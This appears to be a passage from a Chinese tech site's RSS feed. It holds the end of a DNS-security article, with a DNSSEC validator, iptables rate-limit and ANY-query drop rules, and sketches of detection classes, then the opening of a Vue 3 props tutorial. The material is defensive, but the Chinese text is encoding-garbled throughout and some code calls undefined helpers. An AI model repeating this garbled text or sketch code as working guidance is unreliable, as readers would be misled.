            <span class="hljs-string">'å¯†é’¥äº¤æ¢å¯èƒ½è¢«æˆªè·'</span>,
            <span class="hljs-string">'éœ€è¦åé‡å­å¯†ç å­¦'</span>
        ]
        
        <span class="hljs-comment"># é˜²å¾¡ç­–ç•¥</span>
        defenses = {
            <span class="hljs-string">'å½“å‰'</span>: <span class="hljs-string">'DNSSEC + TLS 1.3'</span>,
            <span class="hljs-string">'è¿‡æ¸¡'</span>: <span class="hljs-string">'æ··åˆåŠ å¯†ï¼ˆç»å…¸+é‡å­å®‰å…¨ï¼‰'</span>,
            <span class="hljs-string">'æœªæ¥'</span>: <span class="hljs-string">'åé‡å­å¯†ç å­¦æ ‡å‡†'</span>
        }
</code></pre>
<h2 data-id="heading-20"><strong>äº”ã€å…¨é¢é˜²å¾¡ç­–ç•¥</strong></h2>
<h3 data-id="heading-21"><strong>5.1 å¤šå±‚æ¬¡é˜²å¾¡ä½“ç³»</strong></h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[ç”¨æˆ·å±‚] --&gt; B{é˜²å¾¡æªæ–½}
    B --&gt; C[ä½¿ç”¨DoH/DoT]
    B --&gt; D[å®šæœŸæ£€æŸ¥Hostsæ–‡ä»¶]
    B --&gt; E[ä¿æŒè½¯ä»¶æ›´æ–°]
    
    F[åº”ç”¨å±‚] --&gt; G{é˜²å¾¡æªæ–½}
    G --&gt; H[å®ç°DNSSECéªŒè¯]
    G --&gt; I[ä½¿ç”¨è¯ä¹¦é”å®š]
    G --&gt; J[å¤šCDNç­–ç•¥]
    
    K[ç½‘ç»œå±‚] --&gt; L{é˜²å¾¡æªæ–½}
    L --&gt; M[éƒ¨ç½²BCP38]
    L --&gt; N[DNSé˜²ç«å¢™]
    L --&gt; O[æµé‡æ¸…æ´—ä¸­å¿ƒ]
    
    P[DNSè¿è¥è€…] --&gt; Q{é˜²å¾¡æªæ–½}
    Q --&gt; R[å…³é—­å¼€æ”¾é€’å½’]
    Q --&gt; S[å®æ–½RRL]
    Q --&gt; T[DNSSECéƒ¨ç½²]
</code></pre>
<h3 data-id="heading-22"><strong>5.2 æŠ€æœ¯å®ç°ä»£ç </strong></h3>
<h4 data-id="heading-23"><strong>DNSSECéªŒè¯å®ç°</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> dns.resolver
<span class="hljs-keyword">import</span> dns.dnssec
<span class="hljs-keyword">import</span> dns.rdatatype

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DNSSECValidator</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_with_dnssec</span>(<span class="hljs-params">self, domain</span>):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 1. è·å–DNSKEYè®°å½•</span>
            dnskey_response = dns.resolver.resolve(domain, <span class="hljs-string">'DNSKEY'</span>)
            
            <span class="hljs-comment"># 2. è·å–RRSIGè®°å½•</span>
            rrsig_response = dns.resolver.resolve(domain, <span class="hljs-string">'RRSIG'</span>)
            
            <span class="hljs-comment"># 3. éªŒè¯ç­¾åé“¾</span>
            dns.dnssec.validate(
                dnskey_response.rrset,
                rrsig_response.rrset,
                {domain: dnskey_response.rrset}
            )
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ“ <span class="hljs-subst">{domain}</span> DNSSECéªŒè¯é€šè¿‡"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            
        <span class="hljs-keyword">except</span> dns.dnssec.ValidationFailure <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ— <span class="hljs-subst">{domain}</span> DNSSECéªŒè¯å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> dns.resolver.NoAnswer:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"? <span class="hljs-subst">{domain}</span> æœªé…ç½®DNSSEC"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h4 data-id="heading-24"><strong>DNSé˜²ç«å¢™è§„åˆ™ç¤ºä¾‹</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨iptablesæ„å»ºDNSé˜²ç«å¢™</span>
<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment"># 1. åŸºç¡€é˜²æŠ¤</span>
iptables -A INPUT -p udp --dport 53 -m state --state NEW -m recent \
  --<span class="hljs-built_in">set</span> --name dnsquery --rsource

<span class="hljs-comment"># 2. é™åˆ¶æŸ¥è¯¢é¢‘ç‡</span>
iptables -A INPUT -p udp --dport 53 -m state --state NEW -m recent \
  --update --seconds 1 --hitcount 5 --name dnsquery --rsource -j DROP

<span class="hljs-comment"># 3. é˜»æ­¢ANYæŸ¥è¯¢æ”»å‡»</span>
iptables -A INPUT -p udp --dport 53 -m string \
  --algo bm --hex-string <span class="hljs-string">"|00ff0001|"</span> -j DROP

<span class="hljs-comment"># 4. å“åº”é€Ÿç‡é™åˆ¶ï¼ˆä½¿ç”¨DNSæœåŠ¡å™¨åŠŸèƒ½ï¼‰</span>
<span class="hljs-comment"># BINDé…ç½®ï¼š</span>
<span class="hljs-comment"># rate-limit {</span>
<span class="hljs-comment">#   responses-per-second 10;</span>
<span class="hljs-comment">#   slip 2;</span>
<span class="hljs-comment">#   window 5;</span>
<span class="hljs-comment"># };</span>

<span class="hljs-comment"># 5. ç›‘æ§å’ŒæŠ¥è­¦</span>
iptables -A INPUT -p udp --dport 53 -j LOG \
  --log-prefix <span class="hljs-string">"DNS-Query: "</span> --log-level 6
</code></pre>
<h3 data-id="heading-25"><strong>5.3 ä¼ä¸šçº§é˜²æŠ¤æ¶æ„</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnterpriseDNSProtection</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.components = {
            <span class="hljs-string">'dns_firewall'</span>: DNSFirewall(),
            <span class="hljs-string">'traffic_analyzer'</span>: TrafficAnalyzer(),
            <span class="hljs-string">'threat_intel'</span>: ThreatIntelligence(),
            <span class="hljs-string">'automated_response'</span>: AutoResponder()
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">protect_network</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 1. å®æ—¶æµé‡åˆ†æ</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            packet = capture_packet()
            
            <span class="hljs-comment"># 2. DNSç‰¹å®šæ£€æµ‹</span>
            <span class="hljs-keyword">if</span> packet.haslayer(DNS):
                threat_score = self.analyze_dns_packet(packet)
                
                <span class="hljs-comment"># 3. å¨èƒæƒ…æŠ¥åŒ¹é…</span>
                <span class="hljs-keyword">if</span> self.threat_intel.check_ioc(packet):
                    self.block_and_alert(packet)
                
                <span class="hljs-comment"># 4. è¡Œä¸ºåˆ†æ</span>
                <span class="hljs-keyword">elif</span> threat_score &gt; self.threshold:
                    self.rate_limit_or_block(packet)
                
                <span class="hljs-comment"># 5. å­¦ä¹ æ¨¡å¼</span>
                <span class="hljs-keyword">else</span>:
                    self.update_baseline(packet)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_dns_packet</span>(<span class="hljs-params">self, packet</span>):
        score = <span class="hljs-number">0</span>
        
        <span class="hljs-comment"># æ£€æµ‹æŒ‡æ ‡</span>
        indicators = {
            <span class="hljs-string">'query_length'</span>: <span class="hljs-built_in">len</span>(packet[DNS].qd.qname),
            <span class="hljs-string">'query_type'</span>: packet[DNS].qd.qtype,
            <span class="hljs-string">'response_size'</span>: <span class="hljs-built_in">len</span>(packet) <span class="hljs-keyword">if</span> packet[DNS].qr <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">'client_history'</span>: self.get_client_history(packet[IP].src),
            <span class="hljs-string">'domain_reputation'</span>: self.check_domain_reputation(packet[DNS].qd.qname)
        }
        
        <span class="hljs-comment"># è¯„åˆ†è§„åˆ™</span>
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'query_type'</span>] == <span class="hljs-number">255</span>:  <span class="hljs-comment"># ANYæŸ¥è¯¢</span>
            score += <span class="hljs-number">20</span>
        
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'response_size'</span>] &gt; <span class="hljs-number">2000</span>:  <span class="hljs-comment"># å¤§å“åº”</span>
            score += <span class="hljs-number">15</span>
        
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'domain_reputation'</span>] == <span class="hljs-string">'malicious'</span>:
            score += <span class="hljs-number">50</span>
        
        <span class="hljs-keyword">return</span> score
</code></pre>
<h3 data-id="heading-26"><strong>5.4 ä¸ªäººç”¨æˆ·é˜²æŠ¤æŒ‡å—</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># ä¸ªäººDNSå®‰å…¨è‡ªæŸ¥æ¸…å•</span>

<span class="hljs-section">## ç«‹å³æ£€æŸ¥é¡¹ç›®</span>
<span class="hljs-bullet">-</span> [ ] è·¯ç”±å™¨ç®¡ç†å‘˜å¯†ç æ˜¯å¦å·²ä¿®æ”¹ï¼ˆä¸è¦ä½¿ç”¨admin/adminï¼‰
<span class="hljs-bullet">-</span> [ ] è·¯ç”±å™¨å›ºä»¶æ˜¯å¦æœ€æ–°ç‰ˆæœ¬
<span class="hljs-bullet">-</span> [ ] ç”µè„‘Hostsæ–‡ä»¶æ˜¯å¦è¢«å¼‚å¸¸ä¿®æ”¹
<span class="hljs-bullet">-</span> [ ] æ˜¯å¦ä½¿ç”¨å¯é çš„DNSæœåŠ¡å™¨ï¼ˆå¦‚8.8.8.8, 1.1.1.1ï¼‰

<span class="hljs-section">## æµè§ˆå™¨å®‰å…¨è®¾ç½®</span>
<span class="hljs-bullet">1.</span> Chrome/Firefox: å¯ç”¨DoH
<span class="hljs-bullet">2.</span> ä½¿ç”¨HTTPS Everywhereæ‰©å±•
<span class="hljs-bullet">3.</span> ç¦ç”¨ä¸å®‰å…¨çš„æ’ä»¶

<span class="hljs-section">## ç½‘ç»œä¹ æƒ¯</span>
<span class="hljs-bullet">-</span> é¿å…è¿æ¥å…¬å…±Wi-Fiè¿›è¡Œæ•æ„Ÿæ“ä½œ
<span class="hljs-bullet">-</span> å®šæœŸæ£€æŸ¥é“¶è¡Œè´¦æˆ·å¼‚å¸¸
<span class="hljs-bullet">-</span> å¯¹å¼‚å¸¸é‡å®šå‘ä¿æŒè­¦æƒ•

<span class="hljs-section">## å·¥å…·æ¨è</span>
<span class="hljs-bullet">-</span> DNSLeakTest.com: æ£€æµ‹DNSæ³„éœ²
<span class="hljs-bullet">-</span> GRC DNS Benchmark: æµ‹è¯•DNSæ€§èƒ½å’Œå®‰å…¨
<span class="hljs-bullet">-</span> Wireshark: é«˜çº§ç”¨æˆ·ç½‘ç»œåˆ†æ
</code></pre>
<h2 data-id="heading-27"><strong>å…­ã€æœªæ¥å±•æœ›ï¼šDNSå®‰å…¨çš„æ¼”è¿›</strong></h2>
<h3 data-id="heading-28"><strong>6.1 æ–°æŠ€æœ¯æ ‡å‡†</strong></h3>
<p><strong>æ­£åœ¨å‘å±•çš„æ ‡å‡†</strong>ï¼š</p>
<pre><code class="hljs language-plaintext" lang="plaintext">1. DNS over QUIC (DoQ)
   - ç»“åˆQUICåè®®çš„ä¼˜ç‚¹
   - æ›´å¥½çš„è¿æ¥è¿ç§»å’Œä¸¢åŒ…æ¢å¤

2. Oblivious DNS over HTTPS (ODoH)
   - æ·»åŠ ä»£ç†å±‚ï¼Œéšè—ç”¨æˆ·èº«ä»½
   - è§£å†³DoHçš„ä¸­å¿ƒåŒ–éšç§é—®é¢˜

3. åé‡å­DNSå®‰å…¨
   - NISTåé‡å­å¯†ç å­¦ç«èµ›è·èƒœè€…
   - æŠ—é‡å­è®¡ç®—çš„DNSSEC
</code></pre>
<h3 data-id="heading-29"><strong>6.2 äººå·¥æ™ºèƒ½åœ¨DNSå®‰å…¨ä¸­çš„åº”ç”¨</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIDNSDefender</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.model = self.train_ai_model()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ai_model</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># ä½¿ç”¨å†å²æ”»å‡»æ•°æ®è®­ç»ƒ</span>
        features = [
            <span class="hljs-string">'query_frequency'</span>,
            <span class="hljs-string">'response_amplification'</span>,
            <span class="hljs-string">'domain_entropy'</span>,
            <span class="hljs-string">'geographic_anomaly'</span>,
            <span class="hljs-string">'temporal_pattern'</span>
        ]
        
        <span class="hljs-comment"># æ·±åº¦å­¦ä¹ æ£€æµ‹</span>
        model = Sequential([
            Dense(<span class="hljs-number">128</span>, activation=<span class="hljs-string">'relu'</span>, input_shape=(<span class="hljs-built_in">len</span>(features),)),
            Dropout(<span class="hljs-number">0.3</span>),
            Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">'relu'</span>),
            Dense(<span class="hljs-number">32</span>, activation=<span class="hljs-string">'relu'</span>),
            Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">'sigmoid'</span>)  <span class="hljs-comment"># æ”»å‡»æ¦‚ç‡</span>
        ])
        
        <span class="hljs-keyword">return</span> model
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">realtime_detection</span>(<span class="hljs-params">self, dns_traffic</span>):
        predictions = self.model.predict(dns_traffic)
        
        <span class="hljs-comment"># è‡ªé€‚åº”é˜ˆå€¼</span>
        threshold = self.calculate_dynamic_threshold()
        
        attacks_detected = predictions &gt; threshold
        
        <span class="hljs-comment"># è‡ªåŠ¨åŒ–å“åº”</span>
        <span class="hljs-keyword">for</span> i, is_attack <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(attacks_detected):
            <span class="hljs-keyword">if</span> is_attack:
                self.trigger_response(dns_traffic[i])
</code></pre>
<h2 data-id="heading-30"><strong>æ€»ç»“ï¼šæ„å»ºæ·±åº¦é˜²å¾¡ä½“ç³»</strong></h2>
<p>DNSå®‰å…¨ä¸æ˜¯å•ä¸€æŠ€æœ¯èƒ½è§£å†³çš„é—®é¢˜ï¼Œè€Œæ˜¯éœ€è¦<strong>å¤šå±‚æ¬¡ã€å¤šç»´åº¦çš„é˜²å¾¡</strong>ï¼š</p>
<ol>
<li><strong>åè®®å±‚</strong>ï¼šDNSSECã€DoH/DoTã€å“åº”é€Ÿç‡é™åˆ¶</li>
<li><strong>ç½‘ç»œå±‚</strong>ï¼šBCP38ã€æµé‡æ¸…æ´—ã€é˜²ç«å¢™è§„åˆ™</li>
<li><strong>åº”ç”¨å±‚</strong>ï¼šè¯ä¹¦é”å®šã€CSPç­–ç•¥ã€å­åŸŸåç›‘æ§</li>
<li><strong>ç”¨æˆ·å±‚</strong>ï¼šå®‰å…¨æ„è¯†ã€å®‰å…¨å·¥å…·ã€è‰¯å¥½ä¹ æƒ¯</li>
</ol>
<p><strong>è®°ä½</strong>ï¼šæ”»å‡»è€…åªéœ€è¦æ‰¾åˆ°<strong>ä¸€ä¸ªæ¼æ´</strong>ï¼Œè€Œé˜²å¾¡è€…éœ€è¦ä¿æŠ¤<strong>æ•´ä¸ªç³»ç»Ÿ</strong>ã€‚DNSå®‰å…¨æ˜¯ä¸€åœºæŒç»­çš„æˆ˜æ–—ï¼Œéœ€è¦æŠ€æœ¯ã€ç­–ç•¥å’Œè­¦æƒ•æ€§çš„ç»“åˆã€‚</p>
<p>éšç€æ–°æŠ€æœ¯ï¼ˆå¦‚é‡å­è®¡ç®—ã€5Gã€ç‰©è”ç½‘ï¼‰çš„å‘å±•ï¼ŒDNSæ”»å‡»é¢åªä¼šè¶Šæ¥è¶Šå¤§ã€‚ä½†åªè¦æˆ‘ä»¬æŒç»­å­¦ä¹ ã€é€‚åº”å’Œåˆ›æ–°ï¼Œå°±èƒ½åœ¨è¿™ä¸ªä¸æ–­å˜åŒ–çš„å¨èƒç¯å¢ƒä¸­ä¿æŒå®‰å…¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue ç»„ä»¶é€šä¿¡çš„ 8 ç§æœ€ä½³å®è·µï¼Œä½ çŸ¥é“å‡ ç§ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589932422654459940</link>    <guid>https://juejin.cn/post/7589932422654459940</guid>    <pubDate>2026-01-02T09:11:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654459940" data-draft-id="7580547126360539199" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue ç»„ä»¶é€šä¿¡çš„ 8 ç§æœ€ä½³å®è·µï¼Œä½ çŸ¥é“å‡ ç§ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-02T09:11:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆ˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue ç»„ä»¶é€šä¿¡çš„ 8 ç§æœ€ä½³å®è·µï¼Œä½ çŸ¥é“å‡ ç§ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åˆ˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:11:53.000Z" title="Fri Jan 02 2026 09:11:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç»å¸¸å†™ Vue çš„æœ‹å‹åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼Œåœ¨ Vue çš„åº”ç”¨ä¸­ï¼Œç»„ä»¶åŒ–å¼€å‘å¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç æ›´å®¹æ˜“ç»´æŠ¤ï¼Œè€Œç»„ä»¶ä¹‹é—´çš„<strong>æ•°æ®ä¼ é€’</strong>å’Œ<strong>äº‹ä»¶é€šä¿¡</strong>ä¹Ÿæ˜¯æˆ‘ä»¬å¿…é¡»è¦è§£å†³çš„é—®é¢˜ã€‚</p>
<p>ç»è¿‡å¤šä¸ªé¡¹ç›®çš„å®è·µï¼Œæˆ‘é€æ¸æ‘¸æ¸…äº†Vue3ä¸­8ç§ç»„ä»¶é€šä¿¡æ–¹å¼å’Œé€‚ç”¨åœºæ™¯ã€‚</p>
<p>ä¸‹é¢æ¥ç»™å¤§å®¶åˆ†äº«ä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-0">1. Props / Emitsï¼šæœ€åŸºç¡€çš„çˆ¶å­ä¼ å€¼</h2>
<p>è¿™æ˜¯ Vue çš„å®˜æ–¹æ¨èé€šä¿¡æ–¹å¼ï¼Œéµå¾ª<strong>å•å‘æ•°æ®æµ</strong>åŸåˆ™ï¼Œæ•°æ®åªèƒ½ä»ä¸Šå¾€ä¸‹æµï¼Œäº‹ä»¶ä»ä¸‹å¾€ä¸Šä¼ ã€‚</p>
<h3 data-id="heading-1">Propsï¼šçˆ¶ä¼ å­çš„å•å‘æ•°æ®æµ</h3>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå½“ä½ éœ€è¦æŠŠé…ç½®ã€ç”¨æˆ·ä¿¡æ¯ã€çŠ¶æ€ç­‰æ•°æ®ä»çˆ¶ç»„ä»¶ä¼ é€’ç»™å­ç»„ä»¶æ—¶ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- çˆ¶ç»„ä»¶ Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ä¼ é€’é™æ€å’ŒåŠ¨æ€æ•°æ® --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> 
      <span class="hljs-attr">title</span>=<span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯"</span> 
      <span class="hljs-attr">:user</span>=<span class="hljs-string">"userData"</span>
      <span class="hljs-attr">:count</span>=<span class="hljs-string">"clickCount"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ChildComponent.vue'</span>

<span class="hljs-keyword">const</span> userData = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">'zhangsan@example.com'</span>
})

<span class="hljs-keyword">const</span> clickCount = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å­ç»„ä»¶ ChildComponent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{{ title }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å§“åï¼š{{ user.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å¹´é¾„ï¼š{{ user.age }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é‚®ç®±ï¼š{{ user.email }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç‚¹å‡»æ¬¡æ•°ï¼š{{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

